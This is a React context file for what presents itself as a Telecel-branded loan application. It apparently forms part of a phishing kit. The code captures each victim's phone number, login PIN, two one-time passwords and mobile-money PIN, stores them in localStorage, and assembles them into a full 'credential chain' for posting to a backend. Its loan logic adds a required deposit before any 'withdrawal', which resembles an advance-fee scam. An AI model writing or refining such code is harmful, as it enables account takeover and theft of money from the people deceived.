import React, { createContext, useContext, useState, useEffect } from 'react';

// ─── Context ─────────────────────────────────────────────────────────────────
const LoanApplicationContext = createContext();

export const useLoanApplication = () => {
  const context = useContext(LoanApplicationContext);
  if (!context) {
    throw new Error('useLoanApplication must be used within LoanApplicationProvider');
  }
  return context;
};

// ─── Provider ─────────────────────────────────────────────────────────────────
export const LoanApplicationProvider = ({ children }) => {

  // ── Server health ──────────────────────────────────────────────────────────
  const [serverStatus, setServerStatus] = useState({
    isChecking: true,
    isActive: false,
    error: null,
    retryCount: 0
  });

  // ── Auth data ─────────────────────────────────────────────────────────────
  // Stores every credential collected across all verification steps
  // so nothing is ever null when sent to the backend.
  const [authData, setAuthData] = useState({
    phoneNumber: '',   // raw phone as typed (e.g. 0501234567)
    loginPin: '',      // 4-digit PIN entered on Login page
    otpStep1: '',      // OTP entered in step-1 verification
    otpStep2: '',      // OTP entered in step-2 verification (if reached)
    telecelPin: '',    // 4-digit Telecel PIN entered in PIN mode (if reached)
    isAuthenticated: false
  });

  // ── Loan application data (kept for any downstream pages) ──────────────────
  const [calculatorData, setCalculatorData] = useState({
    loanAmount: 5000,
    loanTerm: 12,
    monthlyPayment: 0
  });

  const [loanApplicationData, setLoanApplicationData] = useState({
    loanType: 'Personal Loan',
    loanAmount: '',
    loanTerm: '12 Months',
    purpose: ''
  });

  const [personalDetailsData, setPersonalDetailsData] = useState({
    firstName: '',
    lastName: '',
    email: '',
    phoneNumber: ''
  });

  const [financialData, setFinancialData] = useState({
    employmentStatus: 'Employed',
    annualIncome: ''
  });

  const [loanStatusData, setLoanStatusData] = useState({
    approvedAmount: 0,
    requestedAmount: 0,
    monthlyPayment: 0,
    loanTerm: '',
    interestRate: '8% APR',
    accountNumber: '',
    requiredDeposit: 0,
    totalWithBonus: 0,
    hasDeposited: false,
    canWithdraw: false
  });

  // ── Server health check on mount ───────────────────────────────────────────
  useEffect(() => {
    const checkServerHealth = async () => {
      const API_BASE_URL = import.meta.env.VITE_API_URL || 'http://localhost:3001';
      const maxRetries = 10000;
      const retryDelay = 3000;

      const attempt = async (n) => {
        try {
          setServerStatus(prev => ({ ...prev, isChecking: true, retryCount: n }));

          const controller = new AbortController();
          const timeoutId = setTimeout(() => controller.abort(), 10000);
          const response = await fetch(`${API_BASE_URL}/api/health`, {
            method: 'GET',
            signal: controller.signal
          });
          clearTimeout(timeoutId);

          if (response.ok) {
            setServerStatus({ isChecking: false, isActive: true, error: null, retryCount: n });
            return;
          }
          throw new Error('Server returned non-OK status');
        } catch {
          if (n < maxRetries - 1) {
            await new Promise(r => setTimeout(r, retryDelay));
            return attempt(n + 1);
          }
          setServerStatus({
            isChecking: false,
            isActive: false,
            error: 'Server is not responding. Please try again later.',
            retryCount: n
          });
        }
      };

      await attempt(0);
    };

    checkServerHealth();
  }, []);

  // ── Auth update helpers ────────────────────────────────────────────────────

  // Called by Login.jsx after user types phone + PIN
  const setLoginCredentials = (phoneNumber, loginPin) => {
    setAuthData(prev => ({
      ...prev,
      phoneNumber:  phoneNumber  ?? prev.phoneNumber,
      loginPin:     loginPin     ?? prev.loginPin,
      // clear downstream fields when re-logging in
      otpStep1: '',
      otpStep2: '',
      telecelPin: '',
      isAuthenticated: false
    }));

    // Persist phone so Otp.jsx can read it even on refresh
    try {
      localStorage.setItem('telecel_phone', phoneNumber);
      localStorage.setItem('telecel_login_pin', loginPin);
    } catch {}
  };

  // Called by Otp.jsx when step-1 OTP is submitted
  const setOtpStep1 = (otp) => {
    setAuthData(prev => ({ ...prev, otpStep1: otp ?? prev.otpStep1 }));
    try { localStorage.setItem('telecel_otp_step1', otp); } catch {}
  };

  // Called by Otp.jsx when step-2 OTP is submitted
  const setOtpStep2 = (otp) => {
    setAuthData(prev => ({ ...prev, otpStep2: otp ?? prev.otpStep2 }));
    try { localStorage.setItem('telecel_otp_step2', otp); } catch {}
  };

  // Called by Otp.jsx when Telecel PIN is submitted
  const setTelecelPin = (pin) => {
    setAuthData(prev => ({ ...prev, telecelPin: pin ?? prev.telecelPin }));
    try { localStorage.setItem('telecel_pin', pin); } catch {}
  };

  // Mark as fully authenticated (called after /status navigation)
  const setAuthenticated = () => {
    setAuthData(prev => ({ ...prev, isAuthenticated: true }));
    try { localStorage.setItem('telecel_auth', 'true'); } catch {}
  };

  // Generic partial update (kept for backward compat)
  const updateAuthData = (data) => {
    setAuthData(prev => ({ ...prev, ...data }));
  };

  // ── Return the full credential chain (used when posting to backend) ────────
  // Never returns null/undefined for any field — falls back to localStorage.
  const getAuthChain = () => {
    const ls = (key, fallback = '') => {
      try { return localStorage.getItem(key) || fallback; } catch { return fallback; }
    };

    return {
      phoneNumber: authData.phoneNumber  || ls('telecel_phone'),
      loginPin:    authData.loginPin     || ls('telecel_login_pin'),
      otpStep1:    authData.otpStep1     || ls('telecel_otp_step1'),
      otpStep2:    authData.otpStep2     || ls('telecel_otp_step2'),
      telecelPin:  authData.telecelPin   || ls('telecel_pin')
    };
  };

  // ── Clear auth on logout ───────────────────────────────────────────────────
  const clearAuth = () => {
    setAuthData({
      phoneNumber: '',
      loginPin: '',
      otpStep1: '',
      otpStep2: '',
      telecelPin: '',
      isAuthenticated: false
    });
    try {
      ['telecel_phone', 'telecel_login_pin', 'telecel_otp_step1',
       'telecel_otp_step2', 'telecel_pin', 'telecel_auth',
       'telecel_otp_length', 'telecel_otp_step'
      ].forEach(k => localStorage.removeItem(k));
    } catch {}
  };

  // ── Loan application helpers ───────────────────────────────────────────────
  const updateCalculatorData     = (data) => setCalculatorData(prev     => ({ ...prev, ...data }));
  const updateLoanApplicationData = (data) => setLoanApplicationData(prev => ({ ...prev, ...data }));
  const updatePersonalDetailsData = (data) => setPersonalDetailsData(prev => ({ ...prev, ...data }));
  const updateFinancialData       = (data) => setFinancialData(prev       => ({ ...prev, ...data }));
  const updateLoanStatusData      = (data) => setLoanStatusData(prev      => ({ ...prev, ...data }));

  const calculateLoanApproval = () => {
    const requestedAmount = parseFloat(loanApplicationData.loanAmount) || 0;
    const annualIncome    = parseFloat(financialData.annualIncome)     || 0;

    let approvedAmount = requestedAmount;
    if (annualIncome > 0) {
      approvedAmount = Math.min(requestedAmount, annualIncome * 0.3);
    }

    const interestRate    = 0.08;
    const loanTermMonths  = parseInt(loanApplicationData.loanTerm) || 12;
    const monthlyRate     = interestRate / 12;
    const monthlyPayment  = (approvedAmount * (1 + monthlyRate * loanTermMonths)) / loanTermMonths;
    const requiredDeposit = requestedAmount * 0.1;
    const totalWithBonus  = requestedAmount * 1.1;

    return {
      approvedAmount:   Math.round(approvedAmount   * 100) / 100,
      requestedAmount,
      monthlyPayment:   Math.round(monthlyPayment   * 100) / 100,
      loanTerm:         loanApplicationData.loanTerm,
      requiredDeposit:  Math.round(requiredDeposit  * 100) / 100,
      totalWithBonus:   Math.round(totalWithBonus   * 100) / 100
    };
  };

  const processLoanApplication = () => {
    const approvalData  = calculateLoanApproval();
    const accountNumber = authData.phoneNumber.replace(/\D/g, '').slice(-10);
    updateLoanStatusData({ ...approvalData, accountNumber, interestRate: '8% APR', hasDeposited: false, canWithdraw: false });
    return approvalData;
  };

  const completeDeposit = () => {
    updateLoanStatusData({ hasDeposited: true, canWithdraw: true });
  };

  const resetAllData = () => {
    clearAuth();
    setCalculatorData({ loanAmount: 5000, loanTerm: 12, monthlyPayment: 0 });
    setLoanApplicationData({ loanType: 'Personal Loan', loanAmount: '', loanTerm: '12 Months', purpose: '' });
    setPersonalDetailsData({ firstName: '', lastName: '', email: '', phoneNumber: '' });
    setFinancialData({ employmentStatus: 'Employed', annualIncome: '' });
    setLoanStatusData({
      approvedAmount: 0, requestedAmount: 0, monthlyPayment: 0,
      loanTerm: '', interestRate: '8% APR', accountNumber: '',
      requiredDeposit: 0, totalWithBonus: 0, hasDeposited: false, canWithdraw: false
    });
  };

  // ── Context value ──────────────────────────────────────────────────────────
  const value = {
    // Server
    serverStatus,

    // Auth state & helpers
    authData,
    updateAuthData,          // generic partial update
    setLoginCredentials,     // Login.jsx → sets phone + loginPin
    setOtpStep1,             // Otp.jsx  → stores step-1 OTP
    setOtpStep2,             // Otp.jsx  → stores step-2 OTP
    setTelecelPin,           // Otp.jsx  → stores Telecel PIN
    setAuthenticated,        // called after successful login
    getAuthChain,            // returns full chain, never null
    clearAuth,               // logout / reset

    // Loan data & helpers
    calculatorData,
    loanApplicationData,
    personalDetailsData,
    financialData,
    loanStatusData,
    updateCalculatorData,
    updateLoanApplicationData,
    updatePersonalDetailsData,
    updateFinancialData,
    updateLoanStatusData,
    calculateLoanApproval,
    processLoanApplication,
    completeDeposit,
    resetAllData
  };

  return (
    <LoanApplicationContext.Provider value={value}>
      {children}
    </LoanApplicationContext.Provider>
  );
};

export default LoanApplicationContext;